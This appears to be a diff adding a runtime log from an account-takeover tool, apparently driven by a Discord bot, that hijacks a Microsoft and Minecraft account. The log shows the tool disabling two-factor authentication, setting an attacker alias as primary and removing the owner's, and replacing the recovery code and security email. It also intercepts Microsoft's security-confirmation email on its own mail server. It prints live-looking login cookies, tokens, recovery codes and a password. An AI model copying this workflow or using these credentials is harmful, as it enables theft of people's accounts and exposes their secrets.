@@ -1,0 +1,131 @@
+[2026-01-14T06:40:59.319Z] [SECURE_LOGGER] Started logging for UID: BbnVEFCaL, Type: secure
+[2026-01-14T06:40:59.322Z] [STEP] secure_started - {"hasHost":true,"hasSettings":true,"username":"eww","context":{"botId":"1455896108159991810","serverName":"Phinxzz's server"}}
+[2026-01-14T06:40:59.325Z] [LOG] [RECODE_SECURE] Starting secure process for UID: BbnVEFCaL, username: eww
+[2026-01-14T06:40:59.329Z] [STEP] initialize_start - {}
+[2026-01-14T06:40:59.330Z] [LOG] [RECODE_SECURE] Initializing secure process...
+[2026-01-14T06:40:59.330Z] [LOG] [RECODE_SECURE] Account object created, login cookie set
+[2026-01-14T06:40:59.345Z] [LOG] [RECODE_SECURE] Axios instance initialized for UID: BbnVEFCaL
+[2026-01-14T06:40:59.350Z] [LOG] [RECODE_SECURE] Status updated: msauth for UID: BbnVEFCaL
+[2026-01-14T06:40:59.352Z] [LOG] Starting recode secure!
+[2026-01-14T06:40:59.352Z] [LOG] [RECODE_SECURE] Optional username provided: eww
+[2026-01-14T06:40:59.352Z] [LOG] [RECODE_SECURE] Getting cookies and authentication...
+[2026-01-14T06:41:00.176Z] [LOG] [RECODE_SECURE] Cookies retrieved: apiCanary=true, amsc=true, canary=true
+[2026-01-14T06:41:00.177Z] [LOG] [RECODE_SECURE] Polishing host with amsc...
+[2026-01-14T06:41:00.498Z] [LOG] [RECODE_SECURE] Host polished, msauth result: success
+[2026-01-14T06:41:00.499Z] [LOG] [RECODE_SECURE] Setting login cookies...
+[2026-01-14T06:41:00.499Z] [LOG] [RECODE_SECURE] Login cookies set successfully
+[2026-01-14T06:41:00.499Z] [LOG] [RECODE_SECURE] Starting login authentication...
+[2026-01-14T06:41:00.501Z] [LOG] Helping with login!
+[2026-01-14T06:41:01.359Z] [LOG] No link!
+[2026-01-14T06:41:01.360Z] [LOG] [RECODE_SECURE] Login helper result: authed
+[2026-01-14T06:41:01.361Z] [LOG] [RECODE_SECURE] Login successful, proceeding with authentication...
+[2026-01-14T06:41:01.361Z] [LOG] Logged in fully authed, should be able to get amrp now!
+[2026-01-14T06:41:01.361Z] [LOG] [THROTTLE] Waiting 1506ms before parallel auth requests...
+[2026-01-14T06:41:02.871Z] [LOG] Got loginCookie: 11-M.C501_BAY.0.U.Cn8DA9f4dWEwrs95DtRhsWd99CjZ7Nt7QE1seWY60L4xqtf*bhbbyB2aP6GFfHkOzeCVjM8x!RM5XOKAqfFV2UOeljs*xXCPRRiTFi7Z998QuTMkE9HviwK80!e!G!DDXYi814IymujsIN5DzPVaAvZLzDyfDNEc!A695t3BmCK01FfsnR*1zmokohANfUSw5PqvaJDDpygw40LbBhgIDOn2JXUYLGjAw83I!oG5HTp540chSQHj8ZPPueOhkTpuR8Wn5!gWiTzAkPFxsHs1Wg!nDKHXM5OdiUrerL4!3qxB
+[2026-01-14T06:41:02.873Z] [LOG] Trying to get XBL! Retry: 0
+[2026-01-14T06:41:02.883Z] [LOG] [AMRP] Attempt 1/3
+[2026-01-14T06:41:02.886Z] [LOG] [AMC] Attempt 1/3
+[2026-01-14T06:41:03.605Z] [LOG] bots|phinx.exe|Command|2026-01-14T06:41:03.605Z
+[2026-01-14T06:41:03.828Z] [LOG] [AMRP] Got T token, posting...
+[2026-01-14T06:41:04.565Z] [LOG] Error: Access token not found in location URL.
+[2026-01-14T06:41:04.567Z] [LOG] Trying to get XBL! Retry: 1
+[2026-01-14T06:41:04.679Z] [LOG] [AMC] ✓ Got AMC cookie
+[2026-01-14T06:41:04.681Z] [LOG] [AMRP] ✓ Got AMRP cookie
+[2026-01-14T06:41:06.411Z] [LOG] Error: Access token not found in location URL.
+[2026-01-14T06:41:06.558Z] [LOG] Got AMRP
+[2026-01-14T06:41:06.559Z] [LOG] Got AMC
+[2026-01-14T06:41:06.559Z] [LOG] Got AMCJWT
+[2026-01-14T06:41:06.568Z] [LOG] Checking Minecraft account
+[2026-01-14T06:41:06.568Z] [LOG] [RECODE_SECURE] XBL result is null, likely timed out or failed
+[2026-01-14T06:41:06.576Z] [LOG] Setting mc as XBL Failed
+[2026-01-14T06:41:07.623Z] [LOG] editautosecure|phinx.exe|Button|editautosecure|1|719325661931634709|2026-01-14T06:41:07.623Z
+[2026-01-14T06:41:08.526Z] [LOG] No unverified emails found
+[2026-01-14T06:41:08.548Z] [LOG] Amrp: FACWCRRtL9q8rZJJVZtFVdSdLjUBEappmg5mAAAMgAAAEC9Abu%2Bh/zojY0ynMmxqYBBACbxjJX%2B8YvYlbLU5Jnd7EbuWZar4mH%2BnaKYxipmhUTAoSXOOorGHn9ODQ6QLEYdJ7ctCJC5eWwmgya/kXvasUbzozmGaucYbPse/gtJbr7nlqhbhyvLqgKn6VpellXXO9%2BA5jISky%2BcIiumihCXa670CBFR2JFZKhWeLtNZozXqZ9GYJTM2UO4XTpYfrazzQf06nuYHBdK6ugAJr6qrepO%2BO9Hx8/5alACCKlMOLwkYKoF%2BHwlenqqGUt2esyfMiGIZW5i7G69d0xK5gyH1ve4D/BEHRDVmtBfTy5MQkkbTNtcbP8Mtm5m1%2BBSLK6XOgg%2BUHjzAdMn2GC8pe0GgkbXRrRyeVAwao9j6vnJDghVd4aFDq%2BJ4LjajDFQ%2BRZS3RZZ22Db%2Bn%2BU9dYOCuwRScQzwrmIAAuQKiQi1ynmpUI0ZuGoCWpvPz28f%2Bp1Qm%2BNDn7ScFBeDCSnj1Nxr5lrgUQxJcdDHf1AmWLKsBgJoobqUvsEpFTvAkE/ps9HEy/M4qoP1y0GrZhy/DnZiPrbcYx/h/kgC5I8%2BYtQrIR6LRvkWCxRYwJWHWNNJLbfoYwv8thq7DjvB5T7htJNElnkVQMyRTeDFMjZ3PihJQ76lLURvSHBXSsqIUYvZQvekxj7LBJvMZ%2BfwnPonmAuc4/q5ynzQ78TWrEgV72f/P3yt/giUJXTRNR4BXJnFAVKh6YIRkmRBHzFa7D0HwEYv1eQ7O5tW7ziI6y0Tn0XI9S3OUogQwjmfLPrJ2BVq31KIW6nrrYleF0l9gvxe/D1NQ8lr1ac79qhCf2C/tqdd5YMBKxy4syMTzymvmJh%2BCBnsHKRS1%2B8uOG1ptMJNZFXeIpanKf4v1KzS0hwmJTTtib3pQRQNUq1AvQn47baHXcGL4bP/NalinSeiI/rjQXIuLP5XL4/9gJlQsGyjaNzvheXIzO43LCtVqEClYyz9DNF/cbeQQsm32j6nn%2BV0e5fF0XZ9z9kJiRqB9pG4oD4F06hiJ/ZCeNJPbZ6x45i%2BTR%2BvNqHwW%2B0OKAuYzZv73Xpu1SDTrRG8pLH8CqBXR5EsJkNCX9ELYgHa91xddKabjXnzL2WFToNzN06%2BNEGe3jSyTNzbsD5qvbEB7qm9YdhjtsTBL4ZNfBMXxQZAb1ysmhCASJzcw3qMK34v4kzNmSxX9PAQp4Uv%2BSVeie0Nnyz/NQ48i0YjwwAsPtWX4rpWdwPLZRO%2BZa5OrGp7ak726wzPyoWp2dYG6hvHtxn0yM/kQTcQ7c6pxjbBvFE8J6iCBoA7ZrAKdtmtw6MtJx8O4ZGhV/yeCJovDjv3njB1fuyNe6stuVJgscLcepUVV74rwpYXsBKioJZxDdRkVKmWdgnvS3DtABKQJhwyyBr8zCAmxD6T8M1kZ8K7MB3Ap5usfZTA554l5BTgKmZZD3atBAiLCg6KzcV9fGUZneZS9Xb9fyJ3dPD/2G2cxVheLkLGrQoJ/vz105AYsVFTOZplkqanWAA4i4q7V6x0djmWiKRVWOB3TJ0xZW1z73LzS6w1LsVVYGCedsebR2sgFSx2GMEzyNYXui5ArBawZR%2BcLtQ4PcyLCsA4J4e1/wzkmuw2p59kid/Y7Xf3JPh%2BFNJ5O4cEAsj/j2lvA3NRyrU17Bfh%2BaIayIexAl5yPbwg8XaSmvFGsMAD1xOmfELILIRaBEdAC2LIsydaF0TwyxBS/6jypsZUdGs%2B6kwSKne3Ero3IoIlDaMh5HkM0%2B3ynqfnbHLhfu1A7r9qLb5WPvXdM6WzJE0zbG5pOsF1vnr5zOE9Lw6o9gAxCLvrhAiTWkWcfTd7aN1X0ybLoUxLaphCvnLPg2LO3McSKaoq0H238Q4uMgd0903OHU/AKjJNNRoQH4oWI1KHkG3qoRwfsN33H8XQ4rKKKAAXXhzVXkHc2EVgw8NTpwrPZtml10mWrqJw/fJ0s3Sl1Sgalu%2BJ16%2BM1g8RjltusMxYdDVvfC2vqOv1sIoK%2BOSP3Dhoz1EBA9EpBGOgcbKGDp3OTJbhXFZ2zzTAnRISM1vopYEW3/Pk2eHsf3IukNKJ6NQsVtxm/iMbAlY%2B0qwRblyT04fXnKqx7IhFBFF20POJ7%2BWd9kVi4XOtfq0vF6Iw3RpQS4Wu2vhbiTj1up7pOzWZLnBX%2BnncHbU2RZW/zqOQtgW7Y47DZR8nsz31ayXly4ZZBGc0dwXpU90U6si21T/uIwJ3d2WyhKn4MxgCUTUSNEjXqfxNAYUvWj12tFQ5L6/Q9DZqsvzb9jCAwCscQ8yESSNjc3DZmSTqzbeiaAYDf0GNWljKZiIS6/yZdxwxeHWKqoHBB%2BQzDARxlDtZ6MdBHWt1AHEnN8rFn/p5vtDoIqAcIbX1V5bQ1iQ3tYFs3FU9%2BYG/Q60gWVNq3m5Dhmm7BcGdHP5DLPpZWKwcrmWTK/X2%2Bb9JXbEpNfX6Kdx6RgKBgn4TGcoG1b16aNz1bUCBwOdBO5/46RRyEbJl0D6NBx%2BVi3RtTzNv4fk1RxejaczHQ3AJ6J7pvXdhFmmuR7qQMPSHXdu/MKrEEBMUi/3DDQmgwVh0jWKH61Kx20PfoRPG7vOk7NMvT4BFNO5JKieCVkd8DuEjNvvuVpNZUtOjjWf3PdZz2cFewGnxfHS415Z7pyyu16LqKzUx0smLyVWKnBmS3MyBzd54WQrjBlLP1v3DazR1YrdW70C4A0RXGC0BENFhpGTQiRcoDrfKM681pb%2BXs3X88oetMBcfP2dgM9u8n8M2fngJ4YMrQ8dKd71CbMXw3tndPdt8wuf/UD4HOKTnJjo%2BQW1boCfBiWi44LcTWyrFQk90z8efLgbL1YRt1L%2B94fWP09B0IyoB6%2BOwoLre4RvatXjvUPp0%2BlXWFNtO2N0ziqPcDrd008gAk6kxhTa4fVelQ0Bg1UTCPECY02Mm8%2Bb4iR5k3uuSj4hpowV2DcfzrLCrYnWhYR0BgzLZobPOkrb1Q1xrPkNv9%2BcDJ8MB6gT80RJ6k76eQjUkThiroWSplRUcaSxyPCq10Exh4pLBkkYaDq6kytb6OFk377i3tlruaPD2713uxkCkzp9D7CSTQjQs3inOeX6AxBE2jtAXSRU5ITC9V%2BoGcoVZpuNsHPpKQoTdKxO2tnrU0cxT9DbGJxJ63vxFkQVT40pDoAt0t2yOvSpJ4%2Bx3vG8MgAJBQp%2Br/4ihWA0L1JXcQU2%2BxOlAgw5MJspnZbhybcrR9 & amsc: QTk4ZTGthCzI1/nCxqwjSD2FuKoF2RssYJwZKKP07mfS80nmNMuBmOgErS+J6oa7r3xavwQG0bTk9Sv8dJJWqSTyCwXNwyTNEFUYCxqiSfz4JrTjG/H01jc8OG867fTpxp+UcAdJHwO9shGXBufnvbNP8wxaR5CG+x4ZTxv5yXKNcxf3tFsY6b9QF3H0TzRyQtWVns2hbWaF0O5nKieLy4tUANSUn1O7vuLRkbS8OasBLdmDX68Cog9sqDYlI9mYX7Lzmwh/Eze5A3VoJ+nI0423jDH/QRUf9OQW5vSQ7a+hwk0VKcLzJIsh3ktkEP1k:2:3c
+[2026-01-14T06:41:09.729Z] [LOG] Disabled TFA (if applicable)
+[2026-01-14T06:41:10.632Z] [STEP] email_retrieved - {"email":"testhandler11@outlook.com"}
+[2026-01-14T06:41:10.635Z] [STEP] recovery_retrieved - {}
+[2026-01-14T06:41:10.638Z] [STEP] security_data_retrieved - {"hasRecovery":true,"hasSecEmail":true,"hasPassword":true}
+[2026-01-14T06:41:10.647Z] [LOG] Getting data for user BbnVEFCaL!
+[2026-01-14T06:41:10.660Z] [LOG] [RECODE_SECURE] Starting recovery/security update...
+[2026-01-14T06:41:10.661Z] [LOG] Netid at handlerecsecure: UrtV38XfRfZakP0NkjCtxYfbFmrJI4XUWkJSd65jQAaZSjkMykBe3ISS+X4N8WcHGUnUMEUM+QTZWKd2z09lXr3QccA00VyjIal5eJL5MnbIV7XKPIrTil2IGW/vN66O:2:3
+[2026-01-14T06:41:10.663Z] [LOG] [rec-secure] Recovery secure called with email=testhandler11@outlook.com recovery=KAX44-QEQAJ-GZL5E-R85RT-584G7
+[2026-01-14T06:41:10.665Z] [LOG] [rec-secure] Context attempt 1/3
+[2026-01-14T06:41:10.668Z] [LOG] [RECODE_SECURE] Waiting for addzyger ready signal...
+[2026-01-14T06:41:10.669Z] [LOG] Got into alias!
+[2026-01-14T06:41:10.670Z] [LOG] Aliasses canary: xilXHX1D9IkeltbcBgwVZ4C6/WyEbB+f9nWZ4bOC5vOAabJ2QhARbpgK96jygA8IOIAWR9C5vQVBg4DxA/shE8hTYwk7832yzjEkKdgQK/7PzurYWcsYH8ipdSx0Ms+R+vSqv9Mq0UIn6OUHchDJy0MXx29Bm1BmSR/y4VWQVyxaCxpHtP3zt1G2nIGfD7cspCCaMMB5ito3sB6aQYn36s+ITyko50Us9Ep3qtyDAt4l798ZJImBC0iCbJ1zq0TM:2:3c
+[2026-01-14T06:41:10.670Z] [LOG] Canary 2: dXaRvJ99PRtbCed2j/JrM6SEwOlqdUIpltwylSwRSYM=0
+[2026-01-14T06:41:10.672Z] [LOG] Setting to {"firstname":"Option is off.","lastname":"Option is off.","dob":"Option is off.","country":"Option is off.","language":"Option is off."}
+[2026-01-14T06:41:10.725Z] [LOG] Section "All MC Extra Tasks" completed in 0.00 seconds
+[2026-01-14T06:41:11.425Z] [WARN] [getUUID] PlayerDB API failed for Couldn't find!: Request failed with status code 400
+[2026-01-14T06:41:11.847Z] [LOG] ❌ Player data not found in the response
+[2026-01-14T06:41:11.848Z] [ERROR] [getUUID] Could not find UUID for Couldn't find! from any source
+[2026-01-14T06:41:12.113Z] [LOG] [rec-secure] telemetryContext missing, proceeding without it (Microsoft may reject).
+[2026-01-14T06:41:12.186Z] [LOG] [rec-secure] Verify attempt 1
+[2026-01-14T06:41:12.368Z] [LOG] No OAuths found.
+[2026-01-14T06:41:13.381Z] [LOG] Added!
+[2026-01-14T06:41:13.382Z] [LOG] [✔] Added alias ivzvywi660z0z7ym@outlook.com to the Account!
+[2026-01-14T06:41:13.387Z] [LOG] [MAKEPRIMARY] Attempting to set ivzvywi660z0z7ym@outlook.com as primary (attempt 1/3)
+[2026-01-14T06:41:13.431Z] [LOG] Failed to remove No OAuths oAuths!
+[2026-01-14T06:41:13.437Z] [LOG] Section "Total Remove Section" completed in 2.73 seconds
+[2026-01-14T06:41:13.740Z] [LOG] [rec-secure] Recover attempt 1
+[2026-01-14T06:41:18.033Z] [LOG] [rec-secure] Recover API error=500
+[2026-01-14T06:41:18.036Z] [LOG] [rec-secure] Refreshing telemetry context from recover error
+[2026-01-14T06:41:18.036Z] [LOG] [rec-secure] Recover attempt 2
+[2026-01-14T06:41:18.219Z] [LOG] makePrimary data: {
+  "apiCanary": "fhhK7f0qqPHL4yYktDLKWWAk79V7U3Uir+A9oR109svG3ZaY19OHjj/C5UsWqkX1tsyWproZNfntMlIMzZm4J47xKFbZNma5hNyCdyG3U9ujWpuIBtmR6Z0X1JND396cKYScuy6mzEn2U0PuhlNZvhWPupi/mEPKayPlhQ/TpVjDGdIryq+oL3KSsX6yfPkQeYw3dAdPOhWr/Q3Ah1Pm0zVc836PjttVXUNYl24R7GoEMAO+WryACMAOXn+fywXS:2:3c"
+}
+[2026-01-14T06:41:18.221Z] [LOG] Set Alias ivzvywi660z0z7ym@outlook.com as your primary alias
+[2026-01-14T06:41:18.226Z] [LOG] [✔] Set ivzvywi660z0z7ym@outlook.com as a Primary Alias for the Account!
+[2026-01-14T06:41:19.441Z] [LOG] Failed to remove testhandler11 alias
+[2026-01-14T06:41:19.443Z] [LOG] [✔] Removed old primary alias testhandler11@outlook.com
+[2026-01-14T06:41:19.863Z] [LOG] Got details: {"email2":"testhandler11@outlook.com","recoveryCode":"L3D5K-HDBVS-D8UE7-ZD9C8-KEAGY","secEmail":"oldm89i11gync3w@lumyx.space","password":"cjgj3bf8stf6jejg"}
+[2026-01-14T06:41:19.864Z] [LOG] %s: %s recoveryTime 9.202s
+[2026-01-14T06:41:19.885Z] [LOG] [RECODE_SECURE] Recovery/security update completed.
+[2026-01-14T06:41:19.887Z] [LOG] [RECODE_SECURE] addzyger ready signal received: true
+[2026-01-14T06:41:20.627Z] [LOG] New SMTP connection from 52.101.43.118
+[2026-01-14T06:41:20.628Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 INFO  [#wuqzqrkvt6a3nypr] Connection from mail-westusazon11022118.outbound.protection.outlook.com
+[2026-01-14T06:41:20.628Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] S: 220 v48602 ESMTP
+[2026-01-14T06:41:20.782Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] C: EHLO SJ2PR03CU001.outbound.protection.outlook.com
+[2026-01-14T06:41:20.783Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] S: 250-v48602 Nice to meet you, mail-westusazon11022118.outbound.protection.outlook.com
+[2026-01-14T06:41:20.783Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] 250-PIPELINING
+[2026-01-14T06:41:20.783Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] 250-8BITMIME
+[2026-01-14T06:41:20.784Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] 250-SMTPUTF8
+[2026-01-14T06:41:20.784Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] 250 STARTTLS
+[2026-01-14T06:41:20.957Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] C: STARTTLS
+[2026-01-14T06:41:20.960Z] [LOG] [%s] %s %s 2026-01-14 06:41:20 DEBUG [#wuqzqrkvt6a3nypr] S: 220 Ready to start TLS
+[2026-01-14T06:41:21.270Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 INFO  [#wuqzqrkvt6a3nypr] Connection upgraded to TLS using TLS_AES_256_GCM_SHA384
+[2026-01-14T06:41:21.433Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] C: EHLO SJ2PR03CU001.outbound.protection.outlook.com
+[2026-01-14T06:41:21.435Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] S: 250-v48602 Nice to meet you, mail-westusazon11022118.outbound.protection.outlook.com
+[2026-01-14T06:41:21.435Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] 250-PIPELINING
+[2026-01-14T06:41:21.436Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] 250-8BITMIME
+[2026-01-14T06:41:21.436Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] 250 SMTPUTF8
+[2026-01-14T06:41:21.656Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] C: MAIL FROM:<account-security-noreply@accountprotection.microsoft.com>
+[2026-01-14T06:41:21.658Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] S: 250 Accepted
+[2026-01-14T06:41:21.659Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] C: RCPT TO:<testhandler1@lumyx.space>
+[2026-01-14T06:41:21.659Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] S: 250 Accepted
+[2026-01-14T06:41:21.660Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] C: DATA
+[2026-01-14T06:41:21.661Z] [LOG] [%s] %s %s 2026-01-14 06:41:21 DEBUG [#wuqzqrkvt6a3nypr] S: 354 End data with <CR><LF>.<CR><LF>
+[2026-01-14T06:41:21.739Z] [LOG] No OAuths found.
+[2026-01-14T06:41:22.097Z] [LOG] ?? New email: account-security-noreply@accountprotection.microsoft.com ? testhandler1@lumyx.space (code: 521839)
+[2026-01-14T06:41:22.098Z] [LOG] [DEBUG] Storing email: receiver=testhandler1@lumyx.space, sender=account-security-noreply@accountprotection.microsoft.com, time=Wed Jan 14 2026 06:41:17 GMT+0000 (Coordinated Universal Time) (type: object)
+[2026-01-14T06:41:22.103Z] [LOG] [DEBUG] Email stored successfully for testhandler1@lumyx.space
+[2026-01-14T06:41:22.106Z] [LOG] [DEBUG] Verification query found 1 emails for testhandler1@lumyx.space
+[2026-01-14T06:41:22.108Z] [LOG] [DEBUG] Most recent email: {
+  "id": 3,
+  "sender": "account-security-noreply@accountprotection.microsoft.com",
+  "receiver": "testhandler1@lumyx.space",
+  "subject": "Microsoft account security confirmation",
+  "description": "Hi,\n\nYou have changed your primary alias from testhandler11@outlook.com to ivzvywi660z0z7ym@outlook.com.\n\nIf you made this change, you don't need to do anything.\n\nIf you didn't make this change, please follow these steps:\n     1. Reset your password by going to https://account.live.com/password/Reset\n     2. Change your primary alias by going to https://account.live.com/\n\nThanks,\nThe Microsoft account team\nPrivacy Statement: https://go.microsoft.com/fwlink/?LinkId=521839\nMicrosoft Corporation, One Microsoft Way, Redmond, WA 98052\n",
+  "time": "1768372877000.0",
+  "ip": null
+}
+[2026-01-14T06:41:22.112Z] [LOG] [%s] %s %s 2026-01-14 06:41:22 DEBUG [#wuqzqrkvt6a3nypr] C: <9023 bytes of DATA>
+[2026-01-14T06:41:22.113Z] [LOG] [%s] %s %s 2026-01-14 06:41:22 DEBUG [#wuqzqrkvt6a3nypr] S: 250 OK: message queued
+[2026-01-14T06:41:22.340Z] [LOG] [%s] %s %s 2026-01-14 06:41:22 DEBUG [#wuqzqrkvt6a3nypr] C: QUIT
+[2026-01-14T06:41:22.341Z] [LOG] [%s] %s %s 2026-01-14 06:41:22 DEBUG [#wuqzqrkvt6a3nypr] S: 221 Bye
+[2026-01-14T06:41:22.495Z] [LOG] [%s] %s %s 2026-01-14 06:41:22 INFO  [#wuqzqrkvt6a3nypr] wuqzqrkvt6a3nypr received "close" event from 52.101.43.118
+[2026-01-14T06:41:22.496Z] [LOG] [%s] %s %s 2026-01-14 06:41:22 INFO  [#wuqzqrkvt6a3nypr] Connection closed to mail-westusazon11022118.outbound.protection.outlook.com
+[2026-01-14T06:41:22.540Z] [STEP] process_complete - {"timeTaken":23.2}
+[2026-01-14T06:41:22.541Z] [SECURE_LOGGER] Completing process...
+[2026-01-14T06:41:22.544Z] [SECURE_LOGGER] Process completed in 23224ms
+[2026-01-14T06:41:22.545Z] [SECURE_LOGGER] Finalizing logger.
